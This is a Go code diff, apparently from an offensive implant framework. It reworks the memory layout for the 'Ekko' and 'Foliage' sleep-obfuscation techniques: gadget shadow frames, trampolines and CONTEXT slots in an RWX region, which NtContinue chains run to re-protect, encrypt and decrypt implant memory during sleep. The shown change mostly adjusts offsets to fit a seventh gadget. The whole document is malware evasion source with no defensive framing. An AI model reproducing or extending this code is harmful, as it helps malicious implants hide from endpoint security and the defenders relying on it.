@@ -71,7 +71,8 @@ var (
 )
 
 // Scratch layout — a single VirtualAlloc'd RWX region, page-aligned
-// (so automatically 16-byte aligned for FXSAVE targets).
+// (so automatically 16-byte aligned for FXSAVE targets). Shared
+// between EkkoStrategy (6 gadgets) and FoliageStrategy (7 gadgets).
 //
 // CRITICAL: Win32 API functions invoked by NtContinue use the caller's
 // Rsp as their stack, growing DOWN from Rsp into lower addresses. If
@@ -84,47 +85,50 @@ var (
 //
 //	+0x0000  (padding — gadget 0's stack grows down into this)
 //	+0x2000  gadget 0 shadow frame (16 bytes, Rsp = +0x2008)
-//	+0x2010  (padding — gadget 1's stack)
 //	+0x4000  gadget 1 shadow frame (Rsp = +0x4008)
-//	+0x4010  (padding — gadget 2's stack)
 //	+0x6000  gadget 2 shadow frame (Rsp = +0x6008)
 //	+0x8000  gadget 3 shadow frame (Rsp = +0x8008)
 //	+0xA000  gadget 4 shadow frame (Rsp = +0xA008)
 //	+0xC000  gadget 5 shadow frame (Rsp = +0xC008)
-//	+0xE000  trampolines          6 × 0x30
-//	+0xE120  ctx slot table       6 × 8
-//	+0xE150  key copy             ≤ 0x40 bytes
-//	+0xE190  USTR pool            32 bytes
-//	+0xF000  contexts             7 × 0x500 (ctxMain + 6 gadgets) = 0x2300
-//	         total scratch = 0x11300 < 128 KB
+//	+0xE000  gadget 6 shadow frame (Rsp = +0xE008) — Foliage only
+//	+0x10000 trampolines          up to 7 × 0x30          = 0x150
+//	+0x10160 ctx slot table       up to 7 × 8             = 0x38 (padded to 0x40)
+//	+0x101A0 key copy             ≤ 0x40 bytes
+//	+0x101E0 USTR pool            32 bytes
+//	+0x11000 contexts             8 × 0x500 (ctxMain + up to 7 gadgets) = 0x2800
+//	         total scratch = 0x13800 < 128 KB
 const (
 	ekkoScratchSize = 128 * 1024
+	ekkoMaxGadgets  = 7
 
-	ekkoShadowStride = 0x2000 // huge gap between gadget Rsps so each stack has 8 KB headroom
-	ekkoShadowOffset = 0x2000
+	ekkoShadowStride  = 0x2000 // huge gap between gadget Rsps so each stack has 8 KB headroom
+	ekkoShadowOffset  = 0x2000
 	ekkoShadowSlotOff = 0x08 // post-CALL alignment offset within each slot
 
-	ekkoTrampOffset = 0xE000
-	ekkoTrampStride = 0x30
+	ekkoTrampOffset = 0x10000
+	ekkoTrampStride = 0x30 // 7 * 0x30 = 0x150; slots start at +0x160 (16-byte-aligned)
 
-	ekkoSlotsOffset = 0xE120
+	ekkoSlotsOffset = 0x10160 // room for up to 7 slots × 8 bytes (= 0x38, padded to 0x40)
 
-	ekkoKeyCopyOffset = 0xE150
+	ekkoKeyCopyOffset = 0x101A0
 	ekkoKeyCopyMax    = 0x40
 
-	ekkoUSTROffset = 0xE190 // dataUSTR + keyUSTR (32 bytes)
+	ekkoUSTROffset = 0x101E0 // dataUSTR + keyUSTR (32 bytes)
 
-	ekkoCtxOffset = 0xF000
+	ekkoCtxOffset = 0x11000
 	ekkoCtxStride = 0x0500
 )
 
 // ekkoLayout holds pointers into the scratch buffer. All pointers
 // are page-aligned-derived, so all CONTEXT pointers satisfy FXSAVE's
 // 16-byte alignment requirement.
+//
+// `ctxs` has capacity for up to ekkoMaxGadgets entries; Ekko uses 6,
+// Foliage uses 7. Unused slots are harmlessly pre-populated.
 type ekkoLayout struct {
 	scratch uintptr
 	ctxMain *api.Context64
-	ctxs    [6]*api.Context64 // ProtRW, Encrypt, Wait, Decrypt, ProtRX, Resume
+	ctxs    [ekkoMaxGadgets]*api.Context64
 }
 
 func newEkkoLayout() (*ekkoLayout, error) {
@@ -135,7 +139,7 @@ func newEkkoLayout() (*ekkoLayout, error) {
 	}
 	l := &ekkoLayout{scratch: addr}
 	l.ctxMain = (*api.Context64)(unsafe.Pointer(addr + ekkoCtxOffset))
-	for i := 0; i < 6; i++ {
+	for i := 0; i < ekkoMaxGadgets; i++ {
 		l.ctxs[i] = (*api.Context64)(unsafe.Pointer(addr + ekkoCtxOffset + uintptr(i+1)*ekkoCtxStride))
 	}
 	return l, nil
